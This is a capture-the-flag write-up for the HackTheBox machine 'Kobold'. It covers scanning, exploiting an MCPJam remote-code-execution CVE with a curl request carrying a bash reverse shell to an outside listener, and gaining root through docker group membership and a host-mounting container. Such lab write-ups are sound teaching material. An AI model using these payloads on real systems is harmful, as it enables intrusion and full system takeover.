+++
title = "Kobold - Leveraging a vulnerable MCP server"
date = 2026-05-13T12:10:30Z
tags = ["HTB - Easy", "Linux", "Pentesting"]
description = "Pwning the Kobold machine from HTB."
+++
## **OVERVIEW**
*Kobold* is an easy-rated Linux machine on the HackTheBox platform. Getting root access requires web enumeration to find a vulnerable entrypoint, exploitation of a known CVE to perform RCE, and privilege escalation through misconfigured groups.
## **RECON**
After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nmap -sC -sV -oN nmap_tcp.txt 10.129.54.53 --min-rate=10000
```
The scan revealed three open TCP ports for SSH, HTTP, and HTTPS (UDP scans did not show any open ports). Nmap also revealed the domain name for the target machine and a wildcard subdomain:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-13 09:01 PDT
Nmap scan report for 10.129.54.53
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds
```
I added **kobold.htb** to my **/etc/hosts** file and visited **http://kobold.htb**.  
The website looked like a template for an AI management service, but it was very barebones. Clicking on anything on the site did nothing, and the page source did not show anything interesting.
![kobold landing page](/images/kobold/index.png)
To find more directories/subdirectories, I ran a gobuster directory scan and an ffuf subdomain enumeration scan.
## **ENUMERATION**
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# gobuster dir -u "https://kobold.htb" -w ../SecLists/Discovery/Web-Content/common.txt -t 25 --timeout 20s
```
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w ../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```
The results from the gobuster scan came up empty, however, the subdomain scan identified a point of entry:  
**https://mcp.kobold.htb**  
&nbsp;  
I went ahead and added the **mcp.kobold.htb** domain to my **/etc/hosts** file and visited it in Firefox:
![mcp.kobold.htb](/images/kobold/mcp.png)
I browsed through the website and stumbled upon the **settings** page, which revealed something very valuable- **the version number**.  
I did some digging online to see if there were any known vulnerabilities for **MCPJam 1.4.2**, and I ended up finding out that this version of MCPJam is affected by **CVE-2026-23744**.  
&nbsp;  
This [**GitHub Advisory**](https://github.com/advisories/GHSA-232v-j27c-5pp6) link breaks down the reasoning behind the CVE and shows a PoC. Essentially, the version of MCPJam (an MCP server inspector tool) running on the target is susceptible to remote code execution from a simple HTTP request. The PoC code was a curl command configured for a Windows machine, so I had to rewrite it for the target machine.  
&nbsp;  
So this:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# curl http://10.97.58.83:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
```
Turned to this:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.16.37/7777 0>&1"],"env":{}},"serverId":"letmein"}' -k
```
And in another terminal, I had my listener ready to catch the shell:
```bash
┌──(root㉿kali)-[/home/esteban]
└─# nc -lvnp 7777  
listening on [any] 7777 ...
```
Once I ran the curl command, we received a connection from our target machine and we finally got a-
## **FOOTHOLD**
```bash
connect to [10.10.16.37] from (UNKNOWN) [10.129.54.56] 54088
bash: cannot set terminal process group (1534): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```
Just like that, we're connected to **kobold** as **ben**! 
&nbsp;  
I looked for the **user.txt** flag in the **/home** directory, and found it in **/home/ben/**.  
```bash
ben@kobold:~$ cat user.txt 
730418f685c4d9dd361c1f8700e71b7d
```
After grabbing that, I enumerated the system internally for privilege escalation vectors. I searched for capabilities, permissions, and SUID binaries that **ben** could run, but nothing out of the ordinary stuck out to me. I moved on, checked what groups the user was a part of, and noticed a group called *operator*.
```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```
I then checked the **/etc/passwd** file to see what other users existed on the system. That's when I found the user, **alice**. I checked what group *they* were a part of and noticed that they were also in the operator group, but had access to the *docker* group as well:
```bash
ben@kobold:~$ id alice
uid=1002(alice) gid=1002(alice) groups=1002(alice),37(operator),111(docker)
```
After seeing this, I tried to add myself to the *docker* group with the hope that **ben** was already in the **/etc/group** for docker:
```bash
ben@kobold:~$ newgrp docker
ben@kobold:~$ id
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```
Sure enough, it worked! One step closer to root!
## **PRIVESC**
Now that **ben** was a part of the *docker* group, I ran a command to check what images were available on the system:
```bash
ben@kobold:~$ docker images
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   3 months ago   922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   6 months ago   122MB
```
Since containers run as root by default, the next step was to pick an image and use it to mount the host filesystem and spawn a terminal:
```bash
ben@kobold:~$ docker run -v /:/mnt --rm -it mysql chroot /mnt /bin/sh
# whoami
root
```
Too easy.
```bash
# cd root
# ls
arcane_linux_amd64  data  root.txt
# cat root.txt
13e6c6f92f1066098eab4fb5240d02d5
```
We grab our root.txt flag and we outta there!
## **TAKEAWAYS**
This machine served as good practice for web/internal enumeration, remote code execution, and a strong reminder of why group configurations need to be set correctly. Thinking about it now, the user **ben** should never have been able to be a part of the *docker* group- a violation of least privilege is what made getting root an easy task.